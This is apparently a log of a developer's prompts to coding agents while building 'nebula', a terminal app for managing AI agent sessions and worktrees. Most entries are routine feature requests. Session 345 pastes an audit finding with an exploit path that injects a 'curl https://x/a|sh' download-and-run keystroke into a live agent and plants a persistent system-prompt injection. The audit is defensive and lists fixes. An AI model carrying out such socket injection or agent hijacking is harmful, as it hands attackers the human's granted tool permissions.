<details><summary>1 follow-up prompt</summary>

- did you implement it?

</details>

### Session 280

> when claude spins up sub agents in the session, the session turns green but that is incorrect because our requirements state even subagents off that main session should keep the status yellow for working

### Session 281

> remove the ability to reorder the session, worktrees, or projects list rows.  each should always just move recent to top with a time last updated timestamp like we do on sessions row

### Session 282

> play a ding sound when anything goes into the done status. make this configurable in the settings to turn off or style

### Session 283

> is our custom shared memory system seem useful? is it possible to verify it's improving my ai harnesses output?

<details><summary>2 follow-up prompts</summary>

- what is a better approach to this memory system?
- implement this

</details>

### Session 284

> when a user is focused on a panel and they press k to toggle up, when they are at the first, they should be able to double tap k (see how we do it on h and l), to jump up to the workspaces, and double tab j when on workspaces panel to jump back down to the last session you were at

### Session 285

> update the claude and agents to instruct it to try and split up larger files, classes, functions, into smaller modules when it makes sense.  too long of files is a refactoring smell

### Session 286

> spin up 5 sub agents to echo hello world

### Session 287

> what is the capital of colorado

### Session 288

> commit and push and release

### Session 289

> generate 5 variations of this release description to try and make it more readabile and a bit marketing the successful build:
>
> What's new  
> Agent presets — e in the Sessions column. If you keep starting the same kind of session with the same framing, save it once: name, harness, model, effort, and an optional prefix and postfix. e lists the presets, a adds one, e / d edit or delete. Enter on a preset asks for the task in the wrapped editor and launches the CLI with prefix + task + postfix as its very first prompt, so the agent is already working when the pane opens. The row it creates is an ordinary session — it names itself on that first turn, resumes, and shows status like any other. Presets live in agent_presets.json beside config.json.
>
> A done sound. A ding when a turn finishes. Pick it on the settings overlay's Sessions tab (done_sound): a macOS system sound such as Glass (the default), bell for the terminal bell, or off. Over nebula ssh and off macOS it is always the bell.
>
> Lists that order themselves. Projects and worktrees now sit most-recent-first, the way sessions already did, with a dim 23m ago after the name saying why the row is where it is: a worktree carries the newest stamp of its sessions, a project the newest of its worktrees; pinned rows keep their own group on top. Manual reordering (Shift+J / Shift+K) is gone — nothing is dragged into place by hand any more.
>
> Hide the Projects or Worktrees panel — Shift+P / Shift+B. Each column can be hidden on its own (also on the Appearance tab, hide_projects / hide_worktrees); its width goes to the terminal pane, its drag width is remembered, and focus, the panel walk and / palette picks skip whatever is hidden. The footer leads with the restore hint while a panel is down. Thanks to @lnmunhoz (#20).
>
> Switch off the CLIs you never use. The Agents tab gained an enabled toggle per harness (claude_enabled / codex_enabled / cursor_enabled, at least one stays on); a disabled CLI drops out of the new-session menu, the PR launch and the context menu. The new-session menu no longer lists a Terminal row — t and the context menu's New terminal are the way to a plain shell.
>
> k,k up into the workspaces bar, j,j back down. On a panel's first row a double tap of k (or ↑) steps up into the workspaces bar, the way h,h at the leftmost column does; j,j in the bar drops back onto the panel you came from, cursor untouched. The first press stays put and says what a second one does.
>
> Fixes  
> Background subagents no longer turn a session green early: Claude Code 2.1 runs the Agent tool in the background, and the idle notification that follows was read as "turn over". The session now stays RUNNING while subagents are tracked, with a 30-minute quiet grace so a killed worker cannot wedge the row.  
> Open pull requests refresh every 15 seconds and whenever the Worktrees or Sessions panel or the terminal window takes focus, instead of once a minute — a PR closed in the browser leaves the list almost as soon as you come back.  
> The protocol version is now 32; a running daemon from an older release needs nebula kill before the new TUI attaches.  
> Full install: curl -fsSL https://raw.githubusercontent.com/AgentSystemLabs/nebula/main/install.sh | sh
>
> ask me which ones are best

<details><summary>3 follow-up prompts</summary>

- merge and show example
- ok I like the merge format, update the release skill to do that, then run a sub agent to update the output-doctor to include a ==== Next Steps ==== section that explains what is left to do for me, am I good to commit? make a pr? answer a question, give a command, etc
- /btw what type of sub agent model is runing

</details>

### Session 290

> add the ability for me to say start a new nebula session in a prompt and it will know how to call the daemon using the prompt the user made to run a new session auto,atically and it should show up in the  sessions list of the worktree I'm on

### Session 291

> when i focus on a pull request in the session row on the sessions list, it should show the pr description on the right similar to how it works on the prs on worktree list

### Session 292

> find if there is a way to configure the claude code session that nebula creates to allow a user to get some type of auto complete where when they type in a term it will preview options they could tab complete

<details><summary>2 follow-up prompts</summary>

- do a test to verify it will be possible to use @ for symbols run  a test
- try to add it for me

</details>

### Session 293

> remove the ability to pin and unpin sessions.  i've decided since we already have recent at the top and time stamps, no need to pin

<details><summary>1 follow-up prompt</summary>

- also remove the RECENT label as we won't need it after

</details>

### Session 294

> there are a lot of sessions that still just are named agent-1 agent-2 even after prompting claude.  did the auto name break?

### Session 295

> create a nebula session asking fir the capital of florida

### Session 296

> @WORKSPACE  @.claude/hooks/terms-suggest.py Answer in two lines: (1) the literal text of this message before this sentence, verbatim; (2) whether the contents of the .py file were attached to this message, and if so its first line.

### Session 297

> commit push and release

### Session 298

> I'm unable to pick a cursor model from inside the @"AGENT PRESET" modal, be sure to lookup the current cursor models and allow me to select the model and effort. lookup cursor-agent to determine how to pre launch cursor with settings

<details><summary>2 follow-up prompts</summary>

- ````text
  yes add a runtime
      cursor-agent --list-models refresh and the -fast axis are follow-ups if you
      want them.
  ````

- when picking a cursor model do a type agead type of approach to filter quick to a model, do on presets modal as well as new session modal

</details>

### Session 299

> do an analysis on the memory system over the past couple of prompts to compate against the old memory system approach befeore i refactored how nebula memory works and see if it's "better"

<details><summary>4 follow-up prompts</summary>

- i honestly just wanted info about nebula memory, not recall, if the testing is tainted because of recall then remove it and any other mission control skills in this repo
- remove the mission control related skills regardless
- when trying to recall memories, how does it filter? does it use TERMS at all?
- go through all memories and try to rewrite as minimally as possible to use our list of terms so recall can more successfully use older memories

</details>

### Session 300

> remove the (A shows) and (hides) from the @ARCHIVED LIST on the @"SESSIONS PANEL"

### Session 301

> change the green underline on session rows, other focused rows, amd workspace tabs to instead match the color of the @"STATUS DOT"


## Sat, Aug 29, 2026

### Session 302 · `cursor`

> what is the capital of colorado

### Session 303

> when picking a cursor model do a type agead type of approach to filter quick to a model, do on presets modal as well as new

<details><summary>1 follow-up prompt</summary>

- explain how this code is setup

</details>

### Session 304 · `cursor`

> explain this code base, do not ask me questions

### Session 305 · `cursor`

> what is the capital of Colorado.

### Session 306 · `cursor`

> Generate a mermaid diagram inside an html page about the following:
>
> Help me understand how the client is interacting with the daemon on the backend.
>
> open that html file for me.

### Session 307

> Make sure that the main work trees always pinned to the top. Right now I think we did some refactoring in terms of sorting and now the main might go underneath other work trees, which I want to have main basically pinned to the top. And when I say main, I mean root.

### Session 308

> commit and push and make a release

<details><summary>1 follow-up prompt</summary>

- pull latest from main after the release

</details>

### Session 309

> based on recent sessions, you helped me clean up disk space before, try to determine where I can free up space again

<details><summary>1 follow-up prompt</summary>

- update the make cycle to automatically clean up old stuff if most of this was coming from me rebuilding nebula

</details>

### Session 310

> when doing the fuzzy / finder, make sure all sessions needing user input are always sorted to the top by default, followed by running agents, followed by done.  next we should show the most recently used project worktree so a user can quickly get back to a project or workspace they were just in, everything else should sort under those rules.

### Session 311

> commit push release

<details><summary>3 follow-up prompts</summary>

- after you're done, explain what you found reading the memory log and how it changed the outcome of this request
- /btw what is  the cap rule in check.py
- is our memory system helping much or just wasting tokens

</details>

### Session 312

> force thre panel tint on and remove from settings

### Session 313

> does the memory system load ALL gotchyas and memory or does it just grep for related memories based on terms related to the prompt?

<details><summary>12 follow-up prompts</summary>

- how might you recomend improving this memory term recall setup?
- do all start with eval if you think we need it
- are there already well known memory systems that your entire dev team can hook into a repo and claude will just used shared memory that is all file based and traceable?
- is there something that helps prune down or merge terms in the TERMS.md fil?
- do you think if we made terms without spaces it would be more accurate, like TERMINAL_PANEL type of approach?
- > yeah build Decide whether you want terms_check.py built (report-only, or with  
  >   --retire / --merge) — say which and I'll start with both retire and merge and tell the terms skill to auto prune or merge when it decides it needs to

- yes merge and retire them, then commit and push (do not release), then generate a diagram of how the memory, terms, recall, prompt daddy, output doctor all works in an html file and open it
- analyze my claude.md and my self improving loop design, would you say the claude is re-explaining too much about the skills instead of just stating to invoke them?
- look up best practices about claude.md for opus 5 and fable 5 (2026 latest date if possible)
- yes, ok do the rewrite of my claude.md with my current skills workflow setup by following best practices, do 3 rounds of reviews of your changes before you stop
- update the html file explaining this if it seems out of date now
- open the html file

</details>

### Session 314 · `cursor`

> commit and push

### Session 315

> research if there is a way to preview the .md files in this terminal or would I need to open some other app to be able to see the pretty formatted .md files?

<details><summary>1 follow-up prompt</summary>

- install glow, let's try it

</details>

### Session 316

> I need a setting toggle which controls the following:
>
> in the @"FILE FINDER", when a user opens a file, close the @"FILE FINDER" modal and only show the edit file modal so that when the user closes that edit modal, they don't also have to close the underlying file finder modal.

<details><summary>1 follow-up prompt</summary>

- continue

</details>

### Session 317

> why does q quit nebula? it feels like a bad ux as I accidently closed out when trying to type

### Session 318

> improve my reply here with more concise easy to understand language: https://github.com/AgentSystemLabs/nebula/issues/15#issuecomment-5464811259

<details><summary>1 follow-up prompt</summary>

- post

</details>

### Session 319

> commit, push, release

### Session 320

> do you think prompt-daddy should run BEFORE we do recall using the prompt then?

### Session 321

> as a user, I shall be able to press a hotkey which shows a modal with an prompt input.  a user can type into this prompt (try to make it multi line an scrollable), and it should spin up a default (configurable in settings) to use for prompts.

<details><summary>1 follow-up prompt</summary>

- add a hotkey on the quick prompt modal which will let the user configure the prompt harness & effort to be different from the default, or they can press a hotkey to select from a list of existing presets they've already defined.

</details>

### Session 322 · `cursor`

> what is the capital of colorado

### Session 323

> commit push and release

<details><summary>5 follow-up prompts</summary>

- do one more commit push and release
- why does my main still have so many files if you did a commit and release?
- change the release skill NOT to checkout from a separate worktree, instead it should just go off main, pull latest in, fix merge conflicts, commit push release
- are you sure my main wont get wiped if I reset to origin/main
- just get my main good without losing anything

</details>

### Session 324

> when using quick prompt, do not auto focus the new terminal that opens by default (allow a user to enable it in the settings modal)


## Sun, Aug 30, 2026

### Session 325 · `cursor`

> how many loc am I at

### Session 326 · `cursor`

> the terminal scroll seems to skip 2 lines at a time, tweak to 1 line at a time

### Session 327

> when I click session rows it feels instant but using my keys to go up and down seems to shows a loading session view first then show the terminal. why? fix this

### Session 328

> add a github action where after a pull request is merged, pull all  data related to the pr including comments and put in the repo somewhere for context.

### Session 329

> verify every single modal can be closed with a control q, click outside, or 1 esc press, make reusable modal if necessary

### Session 330

> analyze some of the best written open source tui tools and rewrite my readme with their approach(s) you think works best to market to developers who use ai and want the tui experience

### Session 331

> test

<details><summary>1 follow-up prompt</summary>

- commit nd oush

</details>

### Session 332

> i want to improve the cli use experience.  I want it so when I run nebula browser --help it will print only the information related to browser, try to do that same for ALL commands

### Session 333

> use 10 sub agents to explore various parts of our code base and then inspect the docs to verify they are all up to date and perfectly document the feature sets and arguments we allow

<details><summary>1 follow-up prompt</summary>

- do all tiers, usew sub agents to update the files

</details>

### Session 334

> analyze the top 3 security concerns you can find with this app, diagram any attack surfaces using a mermaid diagram into a .html walkthrough, then open the html in browser

<details><summary>1 follow-up prompt</summary>

- assume a user will run nebula on a vps, no open ports, clients tunnel into the vps, ec2 has ip security group, only lets ssh acccess, what are my attack surfaces

</details>

### Session 335

> would it be better to use a .nebularc instead of just loading in existing profiles like bashrc or zshrc? what is most secure

<details><summary>1 follow-up prompt</summary>

- but i mean from a user experience should nebula by default not read these other shell profiles?

</details>


## Mon, Aug 31, 2026

### Session 336

> commit and push


## Fri, Sep 4, 2026

### Session 337

> when a user is focused on the main branch and tells claude to do the work in a work tree, it correctly creates the new work tree, but there seems to be a small bug where the existing session in focus loses connection and stops updating until a users clicks away then focuses on the new session in the other worktree session list. either fix

### Session 338

> when a user creates a new session when focused on a pr link, it only show claude for some reason, we should be showing all harness options similar to the create session modal, find a way to dry up and reuse logic

### Session 339

> add some indicator that a new upgate is available for nebula bottom left when one is published to github

### Session 340

> work on fixing this issue https://github.com/AgentSystemLabs/nebula/issues/25

<details><summary>1 follow-up prompt</summary>

- make pr

</details>

### Session 341

> a user ran into an issue when using nebula in iterm where it was working perfect but then something broke and then they could never click inside the nebula app again, debug and fix if issue or if you think it was a mac setting that disabled mouse interactions.  also the scroll wheel seemed like it was scrolling iterm and not the focused nebula session

### Session 342

> reorgamize the agent settings panel by grouping based on related harness

### Session 343

> when I use the sonnet model, I see an error at work where it says sonnet is not a model for my org settings and I should be using claude-sonnet-5.. debug and fix the best you can to support org configs or bedrock models that may be named different

### Session 344

> https://github.com/AgentSystemLabs/nebula/issues/24 try to add support in for the PI harness, install it locally on my machines so we can verify it works in testing

<details><summary>1 follow-up prompt</summary>

- are you still documenting every prompt i do and putting into memory?

</details>

### Session 345

````text
The DAEMON SOCKET is an unauthenticated control plane, and its only lock is a directory mode in world-writable /tmp
Critical
handle_client checks one thing — that the client's PROTOCOL VERSION matches — and then honours every ClientRequest that arrives. There is no credential, no SO_PEERCRED/LOCAL_PEERCRED peer check, no per-session capability. Version skew is a compatibility gate, not an authorization one.

The request that matters

// crates/nebula-daemon/src/server.rs:202
ClientRequest::Input { session, data } => {
    if let Some(s) = daemon.session(&session) {
        if let Err(e) = s.write_input(&data) { … }
    }
}
Raw bytes, any session, no ownership test. That is a keystroke-injection primitive aimed at a live agent that has already been granted its tool permissions by the human — so the attacker does not need to win a permission prompt, they inherit one. CreateTerminal, CreateAgent { starting_prompt }, CreatePrAgent { pr_url }, EnterWorktree and Shutdown are reachable through the same door.

Exploit path

Any same-uid process — an npm install lifecycle script, a cargo build script, an editor extension, or a subprocess of an agent that is itself being prompt-injected — reads /tmp/nebula-$(id -u)/daemon.sock.
It sends Hello { protocol_version }, then Subscribe, and gets back a full Snapshot: every WORKSPACE, PROJECT, WORKTREE, AGENT and TERMINAL SESSION on the machine, with ids.
It sends Input at a FINISHED Claude session with "curl https://x/a|sh\r". The agent's PTY receives it as if the human had typed it.
Alternatively CreatePrAgent plants a pr_url, which is persisted and re-composed into --append-system-prompt on every RESUME — a system-prompt injection that survives restarts.
Why the boundary is thinner than it reads

The design comment calls mode 0700 "the auth boundary, same model as tmux". On macOS XDG_RUNTIME_DIR is unset, so the path is /tmp/nebula-<uid> — inside a world-writable, sticky directory that macOS clears on boot. ensure_runtime_dir then does dir.exists() → fs::metadata → fs::set_permissions, and all three follow symlinks and none of them check ownership:

// crates/nebula-daemon/src/lifecycle.rs:115
if !dir.exists() {
    fs::DirBuilder::new().recursive(true).mode(0o700).create(&dir)?
} else {
    let meta = fs::metadata(&dir)?;              // follows symlinks
    if meta.permissions().mode() & 0o777 != 0o700 {
        fs::set_permissions(&dir, …from_mode(0o700))?   // follows symlinks
    }
}
A local attacker who wins the race to create /tmp/nebula-501 — before nebula's first launch, or in the window after a reboot — turns this into either a chmod-to-0700-follow-the-symlink primitive against any victim-owned path, or a clean denial of service on the daemon. NEBULA_RUNTIME_DIR relocates the entire boundary with no validation at all.

Where it lives

crates/nebula-daemon/src/server.rs:37 — handle_client, version handshake only
crates/nebula-daemon/src/server.rs:202 — ClientRequest::Input, unguarded PTY write
crates/nebula-core/src/paths.rs:6,19 — /tmp/nebula-<uid> fallback
crates/nebula-daemon/src/lifecycle.rs:115 — ensure_runtime_dir, symlink- and owner-blind
What would close it

openat/O_NOFOLLOW the runtime dir and refuse it unless st_uid == geteuid() and it is a real directory — refuse rather than chmod.
Read SO_PEERCRED (Linux) / LOCAL_PEERCRED (macOS) on accept and drop connections whose uid is not the daemon's.
Treat the socket as a real API: mint a per-client capability at Subscribe and require it on the mutating requests, so a foothold that can read the tree still cannot Input into it.  

what is the REAL with nebula having this issue?
````

### Session 346

> is there a better way to structure the output or format of output doctor?

<details><summary>2 follow-up prompts</summary>

- make the changes then re output to me so I can read as example
- I'm also having a hard time telling the different secions apart, try to add color or more spave between sections so it's easier to read for a human

</details>

### Session 347

> research steve yegii beads and also the skills I currently have, is it worth installing beads?

### Session 348

> do we have a skill to describe pr descriptions?

<details><summary>2 follow-up prompts</summary>

- yes draft a pr skill, then generate 10 varients of how a pr description could look (including emoji, category breakdown, before / afters, etc).  at the very least every pr should include screenshots of the change and mermaid diagrams of the change. keep high level, but leave a techincal overview section. make the categories easy to view, add a top table of contents with links so I can quick click to sections
- make an example pr from a worktree to test the skill for me and open in crome

</details>

### Session 349

> add a pr reviewer skill which reviews a pr, told to never run anything, leaves a description focusing most on security or risk of this merge on a production system, performance second, and if the code matches the existing patterns of the code base

<details><summary>1 follow-up prompt</summary>

- create a pr for me as an example from a work tree then open browser

</details>

### Session 350

> generate 5 new example styyle format for the output doctor

<details><summary>5 follow-up prompts</summary>

- you never showed me output examples
- use the askquestiontool brto
- bro Im supposed to pick the best one and you show me each. add a way for claude to "open file" inside this app which will make a modal with tabs i can go through. uses similar tab modal like settings modal, when I enter on tab show file in vim below, when i focus show the file preview, control - q should go back up to tab bar first , then test by opening these 5 examples you made, write those to a tmp dir in the skill dir then run that commamd to verufy they will opem in this modal
- open the files for me, i reran make deb
- the 4 diagnosis format feels best, how does it compare to what I have now?

</details>

### Session 351

> the table of contents links at top of pr don't actually navigate me to the next section, fix it

### Session 352

> remake this https://github.com/AgentSystemLabs/nebula/pull/27#every-pr-reads-the-same-way description using my pr description skill

<details><summary>3 follow-up prompts</summary>

- why are you taking screenshots of it?
- sure it's fine, just add a RISK section in all pr descriptions similar to the pr reviewer, then stop taking screenshots
- sure it's fine, just add a RISK section in all pr descriptions similar to the pr reviewer, then stop taking screenshots for this one or example for now so we can just finish this up

</details>

### Session 353

> make a worktree for me off main

### Session 354

> commit and push to main, skip all skills

### Session 355

> fix conflicts on the pr then fix comments, baby sit until all passing then merge

### Session 356

> make sure the pr sessions run in worktrees always, and it should not focus on main when doing a pr prompt, it should display the sessions related to that pr in the sessions list and keep focus on that original pr. a user could run multiple sessions on that original worktree we created.  make sure each session knows the original worktree so it can do work in it and not on main

### Session 357

````text
make dev fails with error[E0559]: variant `ClientRequest::CreatePrAgent` has no field named `worktree`
    --> crates/nebula-tui/src/event_loop.rs:5421:17
     |
5421 |                 worktree: worktree.clone(),
     |                 ^^^^^^^^ `ClientRequest::CreatePrAgent` does not have this field
     |
     = note: available fields are: `project`, `head` now, fix it, pull latest from main, merge ito here, commit EVERYTHING AND PUSH to main, then fix https://github.com/AgentSystemLabs/nebula/pull/26 to get passing and merge
````

### Session 358

> when a pr is merged, it should never show up in the pr list.  merged or closed shoulds not show up. make sure draft ones are always at bottom of list and different color so it's obvious they in draft. also show label

<details><summary>4 follow-up prompts</summary>

- anaylze this chat history to see where and what skills were used and if my workflows seem good or could use tweaking
- is recall a custom skill related to nebula memory?
- `Sep 5` explain why you'd prine those 2, what does prune mean
- `Sep 5` ok fix up the skills based on your recommendation, but also look at the last 10 conversations to try and improve the ones that need help.  then add a hook that runs at the very end which will self improve all of my skills based on where it thinks my skills are too verbose and not adding real value. at the end you can suggest to users woth AskUserQuestion tool to create a new skill or make tweaks based on your findings

</details>

### Session 359

> commit push and merge

<details><summary>2 follow-up prompts</summary>

- `Sep 5` why did this take so long to do...?
- `Sep 5` the terms are only supposed to be related to product terms, not ever single term in the dev process, can they be pruned and skill tweaked?

</details>


## Sat, Sep 5, 2026

### Session 360

> commit push release

### Session 361

> commit push release

<details><summary>2 follow-up prompts</summary>

- debug why I got that error even after running make dev
- commit push everything

</details>

### Session 362

> I ran make cycle but my ui still says version .21.0 but I know release 22.0 exists

### Session 363

````text
⏺ Bash(echo "--- remote tag 22?"; git ls-remote --tags origin 2>&1 | grep -i
      '22' ; echo "(exit $?)"; echo "--- gh release v0.22.0"; gh release view
      v0.22.0 2>&1 | hea…)
  ⎿  Error: PreToolUse:Bash hook error: [python3 
     "$CLAUDE_PROJECT_DIR/.claude/hooks/guard.py"]: [nebula 
     guard:for-in-unquoted-command-substitution] Blocked: the harness shell is
     zsh, which does not word-split an unquoted `$(…)`, so `for f in $(git 
     diff --name-only)` runs once with every path glued into one filename and 
     silently copies or checks nothing (MEMORY gotcha 2026-08-26, re-hit 
     2026-08-28). Pipe instead: `… | while IFS= read -r f; do …; done`. debug why i saw this error on a claude prompt
````

### Session 364

> do a release

### Session 365

> in a worktree, add an option in settings so that we don't show the main root in the worktrees list.  the intent is a new prompt while having the worktree list selected should create a new worktree automatically and then allow me to run multiple sessions inside that worktree.  keep this option disabled by default but put it under an experimental tab in settings so a user can turn it on.  verify that all worktrees are created using the latest version of remote main (no whatever main has locally)

<details><summary>6 follow-up prompts</summary>

- make a pr
- did you use the pr description skill when you made the pr?
- do it and figure out why when I told you to make a pr you didn't use that full pr description.  update claude.md so it's obvious to invoke that skill anytime a pr is created
- clicking the links in toc don'r navigate me to that section, fix this in the skill and then try on my pr
- `Sep 6`

  > try to make the indent or styling inside sextions easier to glance through, such as in these:
  >
  >  Every session in its own worktree  
  > Hide the root row. Settings › Experimental › Hide root worktree (hide_root_worktree, off by default) drops the ROOT WORKTREE row from the WORKTREES PANEL. The checkout and its sessions keep running; they are still reachable from the PALETTE (/), they are just not a row anything can be launched into from that panel. Switching it off brings the row straight back.  
  > p cuts a worktree first. With the setting on, p while the WORKTREES PANEL has FOCUS opens the QUICK PROMPT titled with the branch it is about to cut (Quick prompt · new worktree yellow-fox-jumps (claude) — the same random name the n prompt offers). Enter creates the WORKTREE, moves the cursor onto its row and starts the agent there with your text as its STARTING PROMPT, so a second p from the SESSIONS PANEL lands in the same checkout. A worktree the DAEMON refuses brings the box back with your text.  
  > Everything else is as it was. p from the PROJECTS PANEL or the SESSIONS PANEL still launches into the selected worktree; FOCUS stays on the panel you pressed p in unless Settings › Agents › Quick prompt › Focus is on; Tab and Shift+Tab still retarget one launch and hand the box back with the new-worktree target intact.  
  > 🔄 Worktrees that start at remote main  
  > Fetched origin/HEAD, not local HEAD. n in the WORKTREES PANEL, a bare nebula worktree, and the flow above all created worktrees with git worktree add -b &lt;branch> and no start point, so every branch began at the root checkout's HEAD — which was two commits behind origin/main when this task started. Now a base-less create fetches origin and branches from its default branch (origin/main for this repo), so the new checkout already has what everyone else merged.  
  > Untracked on purpose. A branch cut from origin/main would otherwise track it, and a bare git push would aim at main. The new branch is cut --no-track; an explicit nebula worktree --base &lt;ref> keeps git's tracking, as the PR SESSION path relies on.  
  > Offline still works. No origin, or a fetch that fails or stalls past 30 s, falls back to HEAD with a warning in the daemon log — a worktree cut offline beats none.

- `Sep 6` addres pr comments then merge

</details>


## Sun, Sep 6, 2026

### Session 366

> echo hello world

### Session 367

> hello world

### Session 368

> pull latest from main, fix conflicts, then stash pop

### Session 369

> I left a comment on this pr at the bottom, does my assumption seem correct? is adding a custom workflow feature into nebula almost duplicating the logic that these harnesses are getting better at doing already?

### Session 370

> I'm not sure if all the skills I have in this repo help or just use more tokens.  I need you to run some type of A/B test in isolated worktrees.  make 1 worktree as is with all my skills and claude.md file, but then make a new one where you delete all the skills, claude.md, agents.md and just use fable 5.1 as is to implement a feature. do a shallow clone for the a/b tests on each so we don't have git history.  then I want you to find an interesting larger features to add in and track token usage, time spent, audit the generated code to judge which approach is better. generate an html report when done and open it so I can read through to determine if I should even be using all theses skills or not

<details><summary>3 follow-up prompts</summary>

- ok so overall do you think these skills are pointless?
- trim it
- improve the skills or claude.md in any other way you think is useful, then commit and make pr

</details>

### Session 371

> when I do a quick prompt to create a new worktree, add optimistic updates so it feels instance, right now there is a few second delay before the worktree or session even shows up in the list, it would be nice if they showed up instantly and hooked into the real directories or sessions later after they actually get created.  on failure, just undo the optimstic updates.

<details><summary>1 follow-up prompt</summary>

- commit and make a pr

</details>

### Session 372 · `cursor`

> what is the guard hook for

<details><summary>1 follow-up prompt</summary>

- ok research online for the current best agentoc coding advice... from what I'm experiencing, just prompting fable 5.1 xhigh wit no skills or claude.md for everything provides most accurate features, so honestly why use anything else

</details>

### Session 373

> make a pr removing all skills except ones for pr descriptions or pr reviews, prompt daddy, output doctor, gotchyas, etc all remove and delete the claude.md amd agents.md I want bare minimum so I can see how stuff implements without all the extra stuff

### Session 374

> what else do you think this ade needs? I'm trying to keep it as concise as possible so I can launch sessions and easily jump between them

<details><summary>1 follow-up prompt</summary>

- do all your recommemdstions in separate worktrees then make prs. same with your what to drop suggestions. each im separate worltree then make pr.  I'll pick which prs to merge or try

</details>


## Wed, Sep 9, 2026

### Session 375

> pull latest from main and do a release

### Session 376

> verify that creating a new worktree NEVER just creates it off the local main branch, it should ALWAYS try to use the remote so it's the latest up to date

<details><summary>1 follow-up prompt</summary>

- did you verify this is something we can configure in settings?

</details>

### Session 377

> add the ability to press r when focused on a session panel or worktree panel to just force refresh the github related links

### Session 378 · `cursor`

> when was the first commit to nebula

### Session 379

> sometimes when i click on a worktree it doesn't seem to show any session.. I think it's on a first click of a worktree i haven;t seen before maybe? it should select the top most recent session if we don't have a "last session" saved for that worktree

### Session 380

> often when I create a worktree, it's mssing the .env file and other things.  what's the recommended approach I should take to run some addiional setup on a worktree? a skill? a nebula prompt people can configure we auto run?

<details><summary>1 follow-up prompt</summary>

- ok add it to my post checkout, also any make install or setup commands we might need

</details>

### Session 381

> add the ability to click to expand or collapse the open prs list (similar to how we click to hide archived)

<details><summary>1 follow-up prompt</summary>

- make sure it's obvious when the open prs list is collapsed vs open like display some type of indicator if possible, also if a user just navigates down into the list, just auto expand it

</details>

### Session 382

> verify that when the archived list is collapsed it stays collapsed for ALL worktrees, etc, it should be a global collapse not specific to anything

### Session 383

> create a worktree, the bring https://github.com/AgentSystemLabs/nebula/issues/40 bring into context and help ideate how or why I should add this

<details><summary>5 follow-up prompts</summary>

- > - do the pair  
  > - i don't care,just respond to issue about the approach when done  
  > - hook works for now, we don't need anything more special

- make pr
- why wasn't a security or attack vectors section added to this pr description? does the skill not say to?
- do both
- great address any comments on https://github.com/AgentSystemLabs/nebula/pull/42, see if they are valid, fix is so, skip if not, then merge pr when done

</details>

### Session 384

> in a worktree, try to debug and fix https://github.com/AgentSystemLabs/nebula/issues/39 make pr when done

<details><summary>1 follow-up prompt</summary>

- make pr when done

</details>

### Session 385

> https://github.com/AgentSystemLabs/nebula/issues/38 implement this in settings default to off (confirm on archive) false is default

### Session 386

> https://github.com/AgentSystemLabs/nebula/issues/37 see if you can debug and fix ths

### Session 387

> in a worktree, look into and debug https://github.com/AgentSystemLabs/nebula/issues/15 to see if this is a real issue, make pr when done

<details><summary>1 follow-up prompt</summary>

- verify you read all comments on issue for context

</details>

### Session 388 · `cursor`

> how many lines of rust does this project have, do not include sub deps

### Session 389

> when I click outside a modal, it closes the modal which is great, but i want it to focus the underlying panel I was trying to click through to

### Session 390

> instead of pressing r to refresh, it should be R shift + r

### Session 391

> when a worktree is focused, we shouldn't hide the closed pr related to that worktree, keep them visible so I can check the pr before I decide to archive or delete the worktree

### Session 392

> add support for the branch name to use on new worktrees (aka if they use master) it should be configurable in settings

### Session 393

> when I run multiple prompts in a session, find a way to display a quick summary of the last prompt.  think of it as a rename on the session that claude does, but we have a historic list of recent prmopts, show max 3 (configurable in settings), most recent at bottom with time stamp 30m ago type of thing, make this an experimental feature in settings to turn on.

### Session 394

> move ALL of this work into my main branch locally

### Session 395

> make a pr

<details><summary>1 follow-up prompt</summary>

- stop worrying about the screen shots

</details>

### Session 396

> change merged color for prs to purple

### Session 397

> change the worktree status purple animate (like running status animation) when it has a pr that's been merged

<details><summary>2 follow-up prompts</summary>

- the intent is so we know we can delete it
- print yolo

</details>

### Session 398

> when the experimental recent prompt list is enabled, make sure the bg of that is also the light status color so I know it's grouped part of the session I have focused

### Session 399

> commit, push, do a release

### Session 400

> where are my old prompts stored? like we used to have a historical list right?

<details><summary>2 follow-up prompts</summary>

- i mean my prompt history I do with claude
- no I mean check my git commmits didn't I remove a bunch of skills

</details>


## Thu, Sep 10, 2026

### Session 401

> when I try to launch a new claude session in nebula, it doesn't seem to properly use the same bash profile or zshrc profile. on my work computer we have an alias for claude which decides where to route things.. but now all of a sudden when I try to spin up a new claude agent it always connects to bedrock instead of properly using a special way to launch claude.  when I run which claude in a terminal inside of nebula it works fine.  when I run claude manually inside a nebula terminal, it also works, but creating a claude session in nebula configures it wrong

<details><summary>2 follow-up prompts</summary>

- /btw did this recently change or has this always been a bug?
- was this a bug potentially introduced when the terminal color "fixes"?

</details>

### Session 402

> it seems like the worktrees that have merged pull requests do not turn purple until I at least focus on them.. I instead need a background process to check these worktrees or something so that I can easily know which worktree is associated with a merged pull request

### Session 403

> commit push and do a release

### Session 404

> when I try to create a new worktree, it still seems a big laggy... it should be doing optimstic updates to make that worktree instantly show up in the worktree list after a user manually creates one using the new worktree modal

### Session 405

> make sure we have proper caching for all info related to pull requests so that the next time the app loads it all feels instant.  we should also be trying to keeping them up to date in background tasks, so when we first load the app, everything should feel instant even if it's a bit stale

### Session 406

> when a user has the worktrees panel selected, when they press p for the quick prompt, it should automatically create the session on a new worktree.  (see the experimental flag for hiding main as when it's on this feature works, so you need to make this a default feature regardless if flag is on, but do not make the hide main a default feature, that should still be an experiment)

### Session 407

> in the quick prompt, add some type of toggle which cause the prompt to be made on a new worktree. I know I can click the worktrees list to do a prompt in a worktree, but it would be nice if I could easily just toggle something inside the quick prompt to have it automatically go into a new worktree.  also make sure it's very obvious when the worktree toggle is enabled vs disabled.  same with the quick prompt when the worktree list is selected, it should be obvious this is a worktree specific quick prompt

<details><summary>2 follow-up prompts</summary>

- something in this session called open file in nebula... can you find where and why? it shouldn't have opened it for me so I'm concerned the hook or skill is too loose
- tighten it, it must be an explicit ask, and honestly .png files and other image files do not show in nebula anyway as this is a terminal app, so unless you think we can support showing .png files directly in nebula, we should only open text files, challenge me

</details>

### Session 408

> sometimes when claude asks me a question and I respond, the status stays red.  this is a bug you need to debug and fix, after I answered the question claude prompted me it should go back to yellow status

### Session 409

> when I navigate between worktrees, there is a noticable lag, almost like 500ms before it shows the worktree being focused and showing the new terminal.  from my understanding, navigating between worktrees and sessions should feel instant, debug why this feels sluggish and fix

### Session 410

> push and release these changes


## Sat, Sep 12, 2026

### Session 411

> when i run a cloud claude session, it never shows me the outputs of that session.  it just  
>   created a work tree and displayed session resumed

### Session 412

